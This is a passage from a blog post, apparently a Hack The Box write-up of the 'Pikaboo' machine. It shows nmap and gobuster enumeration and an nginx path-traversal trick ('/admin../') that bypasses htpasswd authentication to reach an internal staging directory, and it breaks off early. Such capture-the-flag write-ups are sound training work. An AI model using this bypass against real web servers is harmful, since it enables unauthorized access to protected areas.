<!DOCTYPE html>







<html lang="en" 
  
    mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    <!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now">

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Pikaboo HTB" />
<meta name="author" content="tinyb0y" />
<meta property="og:locale" content="en" />
<meta name="description" content="A very tough box with a good knowlege of webservers and perl scripting and a bit of code workthrough." />
<meta property="og:description" content="A very tough box with a good knowlege of webservers and perl scripting and a bit of code workthrough." />
<link rel="canonical" href="http://0.0.0.0:4000/posts/Pikaboo/" />
<meta property="og:url" content="http://0.0.0.0:4000/posts/Pikaboo/" />
<meta property="og:site_name" content="tinyb0y" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-12-04T05:30:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Pikaboo HTB" />
<meta name="twitter:site" content="@t1nyb0y" />
<meta name="twitter:creator" content="@tinyb0y" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"description":"A very tough box with a good knowlege of webservers and perl scripting and a bit of code workthrough.","headline":"Pikaboo HTB","@type":"BlogPosting","dateModified":"2021-12-04T05:30:00+05:30","datePublished":"2021-12-04T05:30:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/posts/Pikaboo/"},"url":"http://0.0.0.0:4000/posts/Pikaboo/","author":{"@type":"Person","name":"tinyb0y"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Pikaboo HTB | tinyb0y
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="tinyb0y">
<meta name="application-name" content="tinyb0y">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/hacker-profile.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">tinyb0y</a>
    </div>
    <div class="site-subtitle font-italic">Pentester. Hacker. Bug Bounty Hunter.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/tinyb0y" aria-label="github"
        
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/t1nyb0y" aria-label="twitter"
        
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['tinyb0y','protonmail.com'].join('@')" aria-label="email"
        
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Pikaboo HTB</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- images -->



  <!-- add CDN prefix if it exists -->

  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

  

  <!-- add image placehoder to prevent layout reflow -->

  

  

  
    
      
      
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  

  



<!-- Add lang-badge for code snippets -->




<!-- return -->





<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Pikaboo HTB</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            tinyb0y
          </span>
          
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






  on

<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sat, Dec  4, 2021,  5:30 AM +0530"
  >Dec  4, 2021<i class="unloaded">2021-12-04T05:30:00+05:30</i>
</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="3366 words">18 min read</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719214112.png" alt="[Pasted image 20210719214112.png]" /></p>

<p>A very tough box with a good knowlege of webservers and perl scripting and a bit of code workthrough.</p>

<ul>
  <li>Nmap</li>
  <li>Recon</li>
  <li>Nginx/Apache Misconfiguration</li>
  <li>FootHold</li>
  <li>User escalation</li>
  <li>Root Privilege Escalation</li>
</ul>

<h3 id="nmap">Nmap</h3>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>root@kali:~/ctf/htb/Pikaboo/10.129.142.104/nmap# <span class="nb">cat </span>Basic_10.129.142.104.nmap
<span class="c"># Nmap 7.80 scan initiated Sun Jul 18 00:53:07 2021 as: nmap -Pn -sCV -p21,22,80 -oN nmap/Basic_10.129.142.104.nmap 10.129.142.104</span>
Nmap scan report <span class="k">for </span>10.129.142.104
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f <span class="o">(</span>RSA<span class="o">)</span>
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Jul 18 00:53:29 2021 -- 1 IP address (1 host up) scanned in 21.83 seconds</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We have three ports open 21,22 and 80.</p>

<p><strong>Port 21</strong>
I tried to login with anonymous account but the login was failed and looked up for vulnerbilities of vsftpd 3.0.3 but nothing was useful in this case.</p>

<p><strong>Port 22</strong>
SSH</p>

<p><strong>Port 80</strong>
WebServer</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210718083954.png" alt="[Pasted image 20210718083954.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210718084220.png" alt="[Pasted image 20210718084220.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210718084253.png" alt="[Pasted image 20210718084253.png]" /></p>

<p>Scrolling through pages we dont have much information and it doesn’t have any endpoints to search for a vulnerability.</p>

<p>Let’s start enumeration of the webserver and see if we find anything useful.</p>

<h3 id="enumeration">Enumeration:</h3>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
</pre></td><td class="rouge-code"><pre>root@kali:~/ctf/htb/Pikaboo# gobuster <span class="nb">dir</span> <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt <span class="nt">-u</span> http://10.129.142.104/ <span class="nt">-x</span> php,html,bak <span class="nt">-o</span> gobuster.txt                                                                                 
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://10.129.142.104/ 
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     php,html,bak
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
/.html <span class="o">(</span>Status: 403<span class="o">)</span>
/.html.php <span class="o">(</span>Status: 403<span class="o">)</span>
/.html.html <span class="o">(</span>Status: 403<span class="o">)</span>
/.html.bak <span class="o">(</span>Status: 403<span class="o">)</span>
/.php <span class="o">(</span>Status: 403<span class="o">)</span>
/admin <span class="o">(</span>Status: 401<span class="o">)</span>
/admin.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/admin.php <span class="o">(</span>Status: 403<span class="o">)</span>
/admin.html <span class="o">(</span>Status: 403<span class="o">)</span>
/admin_panel <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_panel.php <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_panel.html <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_panel.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_test <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_test.php <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_test.html <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_test.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/admindav <span class="o">(</span>Status: 401<span class="o">)</span>
/admindav.php <span class="o">(</span>Status: 401<span class="o">)</span>
/admindav.html <span class="o">(</span>Status: 401<span class="o">)</span>
/admindav.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/adminx <span class="o">(</span>Status: 401<span class="o">)</span>
/adminx.php <span class="o">(</span>Status: 401<span class="o">)</span>
/adminx.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminx.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/.htm.htm <span class="o">(</span>Status: 403<span class="o">)</span>
/.htm.htm.php <span class="o">(</span>Status: 403<span class="o">)</span>
/.htm.htm.html <span class="o">(</span>Status: 403<span class="o">)</span>
/.htm.htm.bak <span class="o">(</span>Status: 403<span class="o">)</span>
/adminclient <span class="o">(</span>Status: 401<span class="o">)</span>
/adminclient.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminclient.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/adminclient.php <span class="o">(</span>Status: 401<span class="o">)</span>
/admin4 <span class="o">(</span>Status: 401<span class="o">)</span>
/admin4.php <span class="o">(</span>Status: 401<span class="o">)</span>
/admin4.html <span class="o">(</span>Status: 401<span class="o">)</span>
/admin4.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_config <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_config.php <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_config.html <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_config.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_files <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_files.html <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_files.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_files.php <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_template <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_template.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_template.php <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_template.html <span class="o">(</span>Status: 401<span class="o">)</span>
/administrace <span class="o">(</span>Status: 401<span class="o">)</span>
/administrace.php <span class="o">(</span>Status: 401<span class="o">)</span>
/administrace.html <span class="o">(</span>Status: 401<span class="o">)</span>
/administrace.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/adminn <span class="o">(</span>Status: 401<span class="o">)</span>
/adminn.php <span class="o">(</span>Status: 401<span class="o">)</span>
/adminn.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminn.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_forums <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_forums.php <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_forums.html <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_forums.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/adminweb <span class="o">(</span>Status: 401<span class="o">)</span>
/adminweb.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminweb.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/adminweb.php <span class="o">(</span>Status: 401<span class="o">)</span>
/adminonline <span class="o">(</span>Status: 401<span class="o">)</span>
/adminonline.php <span class="o">(</span>Status: 401<span class="o">)</span>
/adminonline.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminonline.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/adminscripts <span class="o">(</span>Status: 401<span class="o">)</span>
/adminscripts.php <span class="o">(</span>Status: 401<span class="o">)</span>
/adminscripts.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminscripts.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/adminws <span class="o">(</span>Status: 401<span class="o">)</span>
/adminws.php <span class="o">(</span>Status: 401<span class="o">)</span>
/adminws.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminws.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_logon <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_logon.php <span class="o">(</span>Status: 401<span class="o">)</span>
/adminc <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_logon.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminc.php <span class="o">(</span>Status: 401<span class="o">)</span>
/adminc.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminc.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/admin_logon.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/administrare <span class="o">(</span>Status: 401<span class="o">)</span>
/administrare.php <span class="o">(</span>Status: 401<span class="o">)</span>
/administrare.html <span class="o">(</span>Status: 401<span class="o">)</span>
/administrare.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/administratie <span class="o">(</span>Status: 401<span class="o">)</span>
/administratie.php <span class="o">(</span>Status: 401<span class="o">)</span>
/administratie.html <span class="o">(</span>Status: 401<span class="o">)</span>
/administratie.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/adminonly <span class="o">(</span>Status: 401<span class="o">)</span>
/adminonly.bak <span class="o">(</span>Status: 401<span class="o">)</span>
/adminonly.php <span class="o">(</span>Status: 401<span class="o">)</span>
/adminonly.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminuser <span class="o">(</span>Status: 401<span class="o">)</span>
/adminuser.php <span class="o">(</span>Status: 401<span class="o">)</span>
/adminuser.html <span class="o">(</span>Status: 401<span class="o">)</span>
/adminuser.bak <span class="o">(</span>Status: 401<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We have so many admin pages or it’s some kinda regex on the /admin(regex) which means anything after /admin is redirected to an htpasswd authentication.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719190200.png" alt="[Pasted image 20210719190200.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719190024.png" alt="[Pasted image 20210719190024.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719190336.png" alt="[Pasted image 20210719190336.png]" />
An observation to be made, nginx acts as a proxy for serving webpages from apache server which is internally running on port 81.</p>

<p>After looking at the website, we have some scrolling messages and images on the webpage. May be we can grab some usernames from the images from the meta data</p>
<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre> strings: <span class="o">[</span><span class="s1">'Gotta hunt them all!'</span>, <span class="s1">'Look up a Pikashoo here!'</span>, <span class="s1">'Hide or seek?'</span>, <span class="s1">'Spot the BlindBoi!'</span><span class="o">]</span>,
 
 root@kali:~/ctf/htb/Pikaboo/images# exiftool 1.jpeg 
ExifTool Version Number         : 12.04
File Name                       : 1.jpeg
Directory                       : <span class="nb">.</span>
File Size                       : 53 kB
File Modification Date/Time     : 2021:07:07 15:03:07+05:30
File Access Date/Time           : 2021:07:18 01:18:23+05:30
File Inode Change Date/Time     : 2021:07:18 01:18:00+05:30
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 626
Image Height                    : 375
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span class="o">(</span>1 1<span class="o">)</span>
Image Size                      : 626x375
Megapixels                      : 0.235
 
</pre></td></tr></tbody></table></code></div></div>

<p>But nothing was found in the images. Also i have done some stegonography to see if we can have information on how to proceed with the box. After spending couple of hours playing with images it was a deadend with images.</p>

<p>So at this point, I had only some information on how the webserver works. But I already know how nginx works with some special characters and as nginx has htpasswd on admin directory there may be some more directories too. It will be worth to dig into more.</p>

<p><code class="language-plaintext highlighter-rouge">.;./..;/</code> nginx ignores this combination and passes it tomcat and tomcat ignores ; and translates to <code class="language-plaintext highlighter-rouge">../../</code> which can be deadly in some cases but in this case we have apache in the backend so this technique doesn’t work. So there has to be some way.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719191723.png" alt="[Pasted image 20210719191723.png]" /></p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://10.129.142.104/admin../a
</pre></td></tr></tbody></table></code></div></div>

<p>After researching for a while, I had some observation in the url by placing <code class="language-plaintext highlighter-rouge">../</code> after admin din’t throw me an authentication panel so we successful bypassed the nginx server and we can look for a directory above admin panel.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>root@kali:~/ctf/htb/Pikaboo# gobuster <span class="nb">dir</span> <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt <span class="nt">-u</span> http://10.129.142.104/admin../ <span class="nt">-o</span> gobuster_dir.txt
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://10.129.142.104/admin../ 
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
/admin_staging/ <span class="o">(</span>Status: 302<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We got a directory some kinda staging directory. Let’s explore</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719193307.png" alt="[Pasted image 20210719193307.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210719193322.png" alt="[Pasted image 20210719193322.png]" /></p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
